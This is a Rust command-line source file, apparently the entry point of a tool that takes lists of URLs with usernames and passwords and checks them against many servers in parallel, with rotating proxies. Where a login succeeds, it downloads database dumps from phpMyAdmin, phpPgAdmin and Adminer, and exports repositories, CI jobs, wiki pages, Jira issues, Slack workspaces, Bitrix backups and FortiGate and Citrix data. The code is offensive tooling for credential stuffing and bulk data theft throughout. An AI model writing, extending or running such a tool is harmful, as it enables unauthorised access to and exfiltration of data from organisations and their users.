//! CLI for phpMyAdmin credential scanning and SQL export.
//!
//! Source: C# PhpMyAdmin Export WPF app (project_final) ported to Rust.

use anyhow::Result;
use clap::{Parser, Subcommand};
use pma_app::{
    create_timestamped_results_dir, default_valid_output_dir, download_bitrix_backups,
    download_bitbucket_repos, download_bamboo_exports, download_gitlab_projects, download_jenkins_jobs, download_jira_exports,
    download_xwiki_exports,
    download_phppgadmin_dumps, download_phpmyadmin_exports, download_adminer_exports,
    download_slack_workspace_exports,
    download_fortinet_exports,
    download_citrix_exports,
    dump_targets, load_bitrix_list, load_bitbucket_list, load_bamboo_list, load_credential_list, load_gitlab_list,
    load_jenkins_list, load_jira_list, load_xwiki_list, load_fortinet_list, load_citrix_list, load_slack_list,
    load_phppgadmin_list, load_phpmyadmin_list, load_adminer_list,
    process_targets_combined,
    scan_targets, write_result_buckets, write_valid_targets,
};
use pma_core::ScanStatus;
use pma_net::{
    BitrixClientConfig, BitbucketClientConfig, BambooClientConfig, GitLabClientConfig, JiraClientConfig, XWikiClientConfig,
    JenkinsClientConfig, CitrixClientConfig, FortinetClientConfig, PhpPgAdminClientConfig, AdminerClientConfig, SlackClientConfig,
    PhpMyAdminClientConfig, load_proxy_list,
};
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;
use tracing_subscriber::EnvFilter;

fn cli_proxy(cli: &Cli) -> Option<String> {
    cli.proxy.as_ref().and_then(|s| {
        let t = s.trim();
        if t.is_empty() {
            None
        } else {
            Some(t.to_string())
        }
    })
}

#[derive(Parser, Debug)]
#[command(
    name = "phpmyadmin-rs",
    about = "Scan phpMyAdmin credentials and export SQL dumps (Rust port of PhpMyAdmin Export)",
    version
)]
struct Cli {
    #[command(subcommand)]
    command: Commands,

    /// Request timeout in seconds
    #[arg(long, global = true, default_value_t = 30)]
    timeout: u64,

    /// Export timeout in seconds (C# uses 60)
    #[arg(long, global = true, default_value_t = 60)]
    export_timeout: u64,

    /// Allow invalid TLS certificates
    #[arg(long, global = true, default_value_t = false)]
    insecure: bool,

    /// Outbound proxy (HTTP/HTTPS/SOCKS5), e.g. http://127.0.0.1:8080 or socks5://127.0.0.1:1080
    #[arg(long, global = true)]
    proxy: Option<String>,

    /// Proxy list file (`host:port` per line → socks5). Rotates per target for Citrix/Fortinet.
    #[arg(long, global = true)]
    proxy_file: Option<PathBuf>,

    /// Concurrent workers
    #[arg(short = 'j', long, global = true, default_value_t = 250)]
    threads: usize,

    /// Login attempts per target (C# default: 3)
    #[arg(long, global = true, default_value_t = 3)]
    retries: u32,

    /// Only verify login / access; do not download files
    #[arg(long, global = true, default_value_t = false)]
    check_only: bool,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// Check targets from a list file (url:user:pass)
    Scan {
        /// Input list file
        #[arg(short, long)]
        input: PathBuf,

        /// Write valid targets to this file
        #[arg(short, long)]
        output: Option<PathBuf>,

        /// Write C#-style bucket files (Good.txt, Bad.txt, …)
        #[arg(long)]
        results_dir: Option<PathBuf>,
    },
    /// Export SQL dumps for targets in a list file
    Dump {
        /// Input list file
        #[arg(short, long)]
        input: PathBuf,

        /// Output directory for .sql files
        #[arg(short, long, default_value = "dumps")]
        output: PathBuf,
    },
    /// Scan list, then dump valid targets
    Run {
        /// Input list file
        #[arg(short, long)]
        input: PathBuf,

        /// Output directory for .sql files
        #[arg(short, long, default_value = "dumps")]
        output: PathBuf,

        /// Optional file for valid targets
        #[arg(long)]
        valid_output: Option<PathBuf>,

        /// Write C#-style bucket files alongside dumps
        #[arg(long)]
        results_dir: Option<PathBuf>,
    },
    /// Download owned GitLab projects from a list file (`url user:pass`)
    Gitlab {
        /// Input list file
        #[arg(short, long)]
        input: PathBuf,

        /// Output directory for project archives
        #[arg(short, long, default_value = "gitlab_projects")]
        output: PathBuf,
    },
    /// Download personal Jenkins jobs from a list file (`url user:pass`)
    Jenkins {
        /// Input list file
        #[arg(short, long)]
        input: PathBuf,

        /// Output directory for job configs and artifacts
        #[arg(short, long, default_value = "jenkins_jobs")]
        output: PathBuf,
    },
    /// Download Bitrix admin backups from a list file (`url/bitrix/admin user:pass`)
    Bitrix {
        /// Input list file
        #[arg(short, long)]
        input: PathBuf,

        /// Output directory for Bitrix backups
        #[arg(short, long, default_value = "bitrix_backups")]
        output: PathBuf,
    },
    /// Export PostgreSQL SQL dumps from phpPgAdmin (`https://host/phppgadmin/redirect.php user:pass`)
    Phppgadmin {
        #[arg(short, long)]
        input: PathBuf,

        #[arg(short, long, default_value = "phppgadmin_dumps")]
        output: PathBuf,
    },
    /// Export MySQL SQL dumps from phpMyAdmin (`https://host/phpmyadmin user:pass`)
    Phpmyadmin {
        #[arg(short, long)]
        input: PathBuf,

        #[arg(short, long, default_value = "phpmyadmin_dumps")]
        output: PathBuf,
    },
    /// Export SQL dumps from Adminer (`https://host/adminer.php user:pass`)
    Adminer {
        #[arg(short, long)]
        input: PathBuf,

        #[arg(short, long, default_value = "adminer_dumps")]
        output: PathBuf,
    },
    /// Download owned Bitbucket Server repos from a list file (`url user:pass`)
    Bitbucket {
        /// Input list file
        #[arg(short, long)]
        input: PathBuf,

        /// Output directory for repository archives
        #[arg(short, long, default_value = "bitbucket_repos")]
        output: PathBuf,
    },
    /// Export Jira projects/issues from a list file (`url user:pass`, `/login.jsp` paths ok)
    Jira {
        #[arg(short, long)]
        input: PathBuf,

        #[arg(short, long, default_value = "jira_exports")]
        output: PathBuf,
    },
    /// Export XWiki spaces/pages from a list file (`https://xwiki.domain.com user:pass`)
    Xwiki {
        #[arg(short, long)]
        input: PathBuf,

        #[arg(short, long, default_value = "xwiki_exports")]
        output: PathBuf,
    },
    /// Export Bamboo plans/artifacts (`https://bamboo.example.com user:pass`)
    Bamboo {
        #[arg(short, long)]
        input: PathBuf,

        #[arg(short, long, default_value = "bamboo_exports")]
        output: PathBuf,
    },
    /// Export Slack channels/files (`https://team.slack.com email:pass` or xoxp-token)
    Slack {
        #[arg(short, long)]
        input: PathBuf,

        #[arg(short, long, default_value = "slack_exports")]
        output: PathBuf,
    },
    /// Check/export FortiGate (`https://host:443:admin:password` or IP lists)
    Fortinet {
        #[arg(short, long)]
        input: PathBuf,

        #[arg(short, long, default_value = "fortinet_exports")]
        output: PathBuf,
    },
    /// Check Citrix NetScaler VPN (`https://host/vpn/index.html:user:pass`)
    Citrix {
        #[arg(short, long)]
        input: PathBuf,

        #[arg(short, long, default_value = "citrix_exports")]
        output: PathBuf,
    },
    /// C#-style combined workflow: login + server export + bucket files in one pass
    Process {
        /// Input list file
        #[arg(short, long)]
        input: PathBuf,

        /// Output base directory (creates Results/{timestamp}/ inside)
        #[arg(short, long, default_value = ".")]
        output: PathBuf,

        /// Use a fixed results directory instead of timestamped subfolder
        #[arg(long)]
        results_dir: Option<PathBuf>,
    },
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env().add_directive("phpmyadmin_rs=info".parse()?))
        .init();

    let cli = Cli::parse();
    let outbound_proxy = cli_proxy(&cli);
    let proxy_list: Option<Arc<Vec<String>>> = if let Some(ref path) = cli.proxy_file {
        Some(Arc::new(load_proxy_list(path)?))
    } else {
        None
    };
    let config = Arc::new(PhpMyAdminClientConfig {
        timeout: Duration::from_secs(cli.timeout),
        export_timeout: Duration::from_secs(cli.export_timeout),
        user_agent: None,
        insecure: cli.insecure,
        login_retries: cli.retries,
        proxy: outbound_proxy.clone(),
    });

    match cli.command {
        Commands::Scan {
            input,
            output,
            results_dir,
        } => {
            let creds = load_credential_list(&input).await?;
            let valid_dir = default_valid_output_dir(&input, results_dir.as_deref());
            let results =
                scan_targets(creds, config, cli.threads, Some(&valid_dir), None).await?;
            if let Some(path) = output {
                write_valid_targets(&results, &path).await?;
            }
            if let Some(dir) = results_dir {
                write_result_buckets(&dir, &results).await?;
            }
        }
        Commands::Dump { input, output } => {
            let creds = load_credential_list(&input).await?;
            let targets: Vec<_> = creds
                .into_iter()
                .map(|credential| pma_core::ScanResult {
                    credential,
                    status: ScanStatus::Valid,
                    message: None,
                    databases: Vec::new(),
                })
                .collect();
            dump_targets(targets, output, config, cli.threads, true, None).await?;
        }
        Commands::Run {
            input,
            output,
            valid_output,
            results_dir,
        } => {
            let creds = load_credential_list(&input).await?;
            let valid_dir = default_valid_output_dir(&input, Some(&output));
            let results = scan_targets(
                creds,
                config.clone(),
                cli.threads,
                Some(&valid_dir),
                None,
            )
            .await?;
            if let Some(path) = valid_output {
                write_valid_targets(&results, &path).await?;
            }
            if let Some(dir) = results_dir {
                write_result_buckets(&dir, &results).await?;
            }
            dump_targets(results, output, config, cli.threads, false, None).await?;
        }
        Commands::Process {
            input,
            output,
            results_dir,
        } => {
            let creds = load_credential_list(&input).await?;
            let dir = results_dir.unwrap_or_else(|| create_timestamped_results_dir(&output));
            process_targets_combined(creds, dir, config, cli.threads, None).await?;
        }
        Commands::Gitlab { input, output } => {
            let creds = load_gitlab_list(&input).await?;
            let gitlab_config = Arc::new(GitLabClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
            });
            download_gitlab_projects(creds, output, gitlab_config, cli.threads, !cli.check_only, None, None).await?;
        }
        Commands::Jenkins { input, output } => {
            let creds = load_jenkins_list(&input).await?;
            let jenkins_config = Arc::new(JenkinsClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
            });
            download_jenkins_jobs(creds, output, jenkins_config, cli.threads, !cli.check_only, None, None).await?;
        }
        Commands::Bitrix { input, output } => {
            let creds = load_bitrix_list(&input).await?;
            let bitrix_config = Arc::new(BitrixClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
            });
            download_bitrix_backups(creds, output, bitrix_config, cli.threads, !cli.check_only, None, None).await?;
        }
        Commands::Phppgadmin { input, output } => {
            let creds = load_phppgadmin_list(&input).await?;
            let pg_config = Arc::new(PhpPgAdminClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
                proxy: outbound_proxy.clone(),
            });
            download_phppgadmin_dumps(creds, output, pg_config, cli.threads, !cli.check_only, None, None).await?;
        }
        Commands::Phpmyadmin { input, output } => {
            let creds = load_phpmyadmin_list(&input).await?;
            let pma_config = Arc::new(PhpMyAdminClientConfig {
                timeout: Duration::from_secs(cli.timeout),
                export_timeout: Duration::from_secs(cli.export_timeout),
                user_agent: None,
                insecure: cli.insecure,
                login_retries: cli.retries,
                proxy: outbound_proxy.clone(),
            });
            download_phpmyadmin_exports(
                creds,
                output,
                pma_config,
                cli.threads,
                !cli.check_only,
                None,
                None,
            )
            .await?;
        }
        Commands::Adminer { input, output } => {
            let creds = load_adminer_list(&input).await?;
            let adminer_config = Arc::new(AdminerClientConfig {
                timeout: Duration::from_secs(cli.timeout),
                export_timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
                proxy: outbound_proxy.clone(),
            });
            download_adminer_exports(
                creds,
                output,
                adminer_config,
                cli.threads,
                !cli.check_only,
                None,
                None,
            )
            .await?;
        }
        Commands::Bitbucket { input, output } => {
            let creds = load_bitbucket_list(&input).await?;
            let bitbucket_config = Arc::new(BitbucketClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
            });
            download_bitbucket_repos(creds, output, bitbucket_config, cli.threads, !cli.check_only, None, None).await?;
        }
        Commands::Jira { input, output } => {
            let creds = load_jira_list(&input).await?;
            let jira_config = Arc::new(JiraClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
            });
            download_jira_exports(creds, output, jira_config, cli.threads, !cli.check_only, None, None).await?;
        }
        Commands::Xwiki { input, output } => {
            let creds = load_xwiki_list(&input).await?;
            let config = Arc::new(XWikiClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
            });
            download_xwiki_exports(creds, output, config, cli.threads, !cli.check_only, None, None).await?;
        }
        Commands::Bamboo { input, output } => {
            let creds = load_bamboo_list(&input).await?;
            let config = Arc::new(BambooClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
            });
            download_bamboo_exports(
                creds,
                output,
                config,
                cli.threads,
                !cli.check_only,
                None,
                None,
            )
            .await?;
        }
        Commands::Slack { input, output } => {
            let creds = load_slack_list(&input).await?;
            let config = Arc::new(SlackClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
            });
            download_slack_workspace_exports(
                creds,
                output,
                config,
                cli.threads,
                !cli.check_only,
                None,
                None,
            )
            .await?;
        }
        Commands::Fortinet { input, output } => {
            let creds = load_fortinet_list(&input).await?;
            let config = Arc::new(FortinetClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
                proxy: outbound_proxy.clone(),
            });
            download_fortinet_exports(
                creds,
                output,
                config,
                proxy_list.clone(),
                cli.threads,
                !cli.check_only,
                None,
                None,
            )
            .await?;
        }
        Commands::Citrix { input, output } => {
            let creds = load_citrix_list(&input).await?;
            let config = Arc::new(CitrixClientConfig {
                timeout: Duration::from_secs(cli.export_timeout),
                insecure: cli.insecure,
                proxy: outbound_proxy,
            });
            download_citrix_exports(
                creds,
                output,
                config,
                proxy_list,
                cli.threads,
                !cli.check_only,
                None,
                None,
            )
            .await?;
        }
    }

    Ok(())
}
